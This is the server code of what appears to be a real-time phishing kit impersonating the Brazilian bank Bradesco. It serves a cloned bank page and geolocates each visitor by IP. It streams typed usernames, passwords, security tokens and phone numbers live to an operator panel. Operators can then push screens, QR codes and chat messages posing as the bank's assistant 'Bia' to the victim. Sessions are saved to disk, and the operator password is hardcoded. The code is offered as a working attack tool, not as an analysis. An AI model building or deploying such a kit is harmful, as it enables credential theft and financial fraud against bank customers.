// index.ts
import "dotenv/config";
import express from "express";
import { createServer } from "http";
import path2 from "path";
import fs2 from "fs";
import { Server } from "socket.io";

// persistence.ts
import fs from "fs";
import path from "path";
var DATA_FILE = path.resolve(process.cwd(), "data_sessions.json");
function loadSessions() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf-8");
      const parsed = JSON.parse(data);
      return new Map(Object.entries(parsed));
    }
  } catch (err) {
    console.error("[PERSISTENCE] Erro ao carregar sess\xF5es:", err);
  }
  return /* @__PURE__ */ new Map();
}
function saveSessions(sessions2) {
  try {
    const obj = Object.fromEntries(sessions2);
    fs.writeFileSync(DATA_FILE, JSON.stringify(obj, null, 2), "utf-8");
  } catch (err) {
    console.error("[PERSISTENCE] Erro ao salvar sess\xF5es:", err);
  }
}

// index.ts
var app = express();
var server = createServer(app);
var io = new Server(server, {
  cors: { origin: "*" },
  maxHttpBufferSize: 10 * 1024 * 1024
});
app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ limit: "50mb", extended: true }));
var sessions = loadSessions();
setInterval(() => {
  saveSessions(sessions);
}, 5e3);
function getClientIp(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) {
    const ip = forwarded.split(",")[0].trim();
    return ip.replace(/^.*:/, "");
  }
  const remoteIp = req.socket?.remoteAddress || "127.0.0.1";
  return remoteIp.replace(/^.*:/, "");
}
async function geoLocate(ip) {
  if (ip === "127.0.0.1" || ip === "::1" || ip.startsWith("192.168.") || ip.startsWith("10.")) {
    return { pais: "Local", estado: "Desenvolvimento", cidade: "Localhost" };
  }
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city`);
    const data = await response.json();
    if (data.status === "success") {
      return {
        pais: data.country || "Desconhecido",
        estado: data.regionName || "Desconhecido",
        cidade: data.city || "Desconhecido"
      };
    }
  } catch (err) {
    console.error("[GEO] Erro ao consultar geolocaliza\xE7\xE3o:", err);
  }
  return { pais: "Desconhecido", estado: "Desconhecido", cidade: "Desconhecido" };
}
function detectDevice(ua) {
  if (!ua) return "Desconhecido";
  const lowerUA = ua.toLowerCase();
  if (lowerUA.includes("iphone") || lowerUA.includes("ipad") || lowerUA.includes("ipod")) return "iOS";
  if (lowerUA.includes("android")) return "Android";
  if (lowerUA.includes("windows")) return "Windows";
  if (lowerUA.includes("macintosh") || lowerUA.includes("mac os")) return "MacOS";
  if (lowerUA.includes("linux")) return "Linux";
  return "Desktop";
}
function snapshotSessions() {
  return Array.from(sessions.values()).map((s) => ({ ...s }));
}
var OPERATOR_PASSWORD = "151612";
app.post("/api/login", (req, res) => {
  const { password } = req.body;
  if (password === OPERATOR_PASSWORD) {
    res.json({ success: true, token: "session_valid" });
  } else {
    res.status(401).json({ success: false, message: "Senha incorreta" });
  }
});
var bradescoPublicDir = path2.resolve(process.cwd(), "client/public");
app.use(express.static(bradescoPublicDir));
app.get("/cliente", (req, res) => {
  const htmlPath = path2.join(bradescoPublicDir, "bradesco.html");
  if (!fs2.existsSync(htmlPath)) {
    res.status(500).send("bradesco.html n\xE3o encontrado");
    return;
  }
  let html = fs2.readFileSync(htmlPath, "utf-8");
  const inject = `
<script src="/socket.io/socket.io.js"></script>
<script src="/cliente-bridge.js"></script>
<link rel="stylesheet" href="/__bridge__/cliente-bridge.css">
`;
  html = html.replace("</head>", `${inject}</head>`);
  res.set("Content-Type", "text/html; charset=utf-8");
  res.send(html);
});
app.get("/cliente-bridge.js", (_req, res) => {
  res.sendFile(path2.join(bradescoPublicDir, "__bridge__/cliente-bridge.js"));
});
var distPath = path2.resolve(process.cwd(), "dist");
if (fs2.existsSync(distPath)) {
  app.use(express.static(distPath));
  app.get("/admin*", (req, res) => {
    const indexPath = path2.join(distPath, "index.html");
    if (fs2.existsSync(indexPath)) {
      res.sendFile(indexPath);
    } else {
      res.status(404).send("Admin Panel build not found.");
    }
  });
}
io.on("connection", (socket) => {
  const role = socket.handshake.query.role || "client";
  const ip = getClientIp(socket.request);
  const ua = socket.handshake.headers["user-agent"] || "";
  if (role === "operator") {
    socket.join("operators");
    socket.emit("operator:sessions", snapshotSessions());
    socket.on("operator:command", (data) => {
      const s2 = sessions.get(data.sessionId);
      if (!s2) return;
      s2.telaAtual = data.command;
      s2.ultimaAtualizacao = Date.now();
      if (s2.socketId) {
        io.to(s2.socketId).emit("client:command", { command: data.command, payload: data.payload });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
    socket.on("operator:enviar-info", (data) => {
      const s2 = sessions.get(data.sessionId);
      if (!s2) return;
      s2.nomeEnviado = data.nome || s2.nomeEnviado;
      s2.serialEnviado = data.serial || s2.serialEnviado;
      if (data.qrCode) s2.qrCodeEnviado = data.qrCode;
      s2.ultimaAtualizacao = Date.now();
      if (s2.socketId) {
        io.to(s2.socketId).emit("client:info", { nome: s2.nomeEnviado, serial: s2.serialEnviado, qrCode: s2.qrCodeEnviado });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
    socket.on("operator:enviar-referencia", (data) => {
      const s2 = sessions.get(data.sessionId);
      if (!s2) return;
      s2.referencia = data.referencia;
      s2.ultimaAtualizacao = Date.now();
      if (s2.socketId) {
        io.to(s2.socketId).emit("client:referencia", { referencia: data.referencia });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
    socket.on("operator:bia-message", (data) => {
      const s2 = sessions.get(data.sessionId);
      if (!s2) return;
      s2.mensagensBia.push({ de: "operador", texto: data.texto, ts: Date.now() });
      s2.ultimaAtualizacao = Date.now();
      if (s2.socketId) {
        io.to(s2.socketId).emit("client:bia-message", { texto: data.texto, ts: Date.now() });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
    socket.on("operator:qrcode", (data) => {
      const s2 = sessions.get(data.sessionId);
      if (!s2) return;
      s2.qrCodeEnviado = data.qrCode;
      s2.ultimaAtualizacao = Date.now();
      if (s2.socketId) {
        io.to(s2.socketId).emit("client:qrcode", { qrCode: data.qrCode });
      }
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
    socket.on("operator:delete-session", (data) => {
      const s2 = sessions.get(data.sessionId);
      if (s2 && s2.socketId) {
        io.to(s2.socketId).emit("client:disconnect");
      }
      sessions.delete(data.sessionId);
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
    return;
  }
  const sessionId = ip;
  let s = sessions.get(sessionId);
  const device = detectDevice(ua);
  if (!s) {
    geoLocate(ip).then((geo) => {
      const newSession = {
        sessionId,
        socketId: socket.id,
        operatorSocketId: null,
        usuario: "",
        senha: "",
        ip,
        pais: geo.pais,
        estado: geo.estado,
        cidade: geo.cidade,
        device,
        status: "online",
        telaAtual: "login",
        conectadoEm: Date.now(),
        ultimaAtualizacao: Date.now(),
        token: "",
        ddd: "",
        telefone: "",
        mensagensBia: [],
        avatarBia: "",
        nomeEnviado: "",
        serialEnviado: "",
        qrCodeEnviado: "",
        referencia: ""
      };
      sessions.set(sessionId, newSession);
      socket.emit("client:welcome", { sessionId });
      io.to("operators").emit("operator:sessions", snapshotSessions());
    });
  } else {
    s.socketId = socket.id;
    s.status = "online";
    s.device = device;
    s.ultimaAtualizacao = Date.now();
    socket.emit("client:welcome", { sessionId });
    io.to("operators").emit("operator:sessions", snapshotSessions());
  }
  socket.on("client:input", (data) => {
    const sess = sessions.get(sessionId);
    if (!sess) return;
    if (data.campo === "usuario") sess.usuario = data.valor;
    if (data.campo === "senha") sess.senha = data.valor;
    if (data.campo === "token") sess.token = data.valor;
    if (data.campo === "ddd") sess.ddd = data.valor;
    if (data.campo === "telefone") sess.telefone = data.valor;
    sess.ultimaAtualizacao = Date.now();
    io.to("operators").emit("operator:sessions", snapshotSessions());
  });
  socket.on("client:tela-mudou", (data) => {
    const sess = sessions.get(sessionId);
    if (!sess) return;
    sess.telaAtual = data.tela;
    sess.ultimaAtualizacao = Date.now();
    io.to("operators").emit("operator:sessions", snapshotSessions());
  });
  socket.on("client:bia-message", (data) => {
    const sess = sessions.get(sessionId);
    if (!sess) return;
    sess.mensagensBia.push({ de: "cliente", texto: data.texto, ts: Date.now() });
    sess.ultimaAtualizacao = Date.now();
    io.to("operators").emit("operator:sessions", snapshotSessions());
  });
  socket.on("disconnect", () => {
    const sess = sessions.get(sessionId);
    if (sess) {
      sess.socketId = null;
      sess.status = "offline";
      sess.ultimaAtualizacao = Date.now();
    }
    io.to("operators").emit("operator:sessions", snapshotSessions());
  });
});
var port = process.env.PORT || 3e3;
server.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
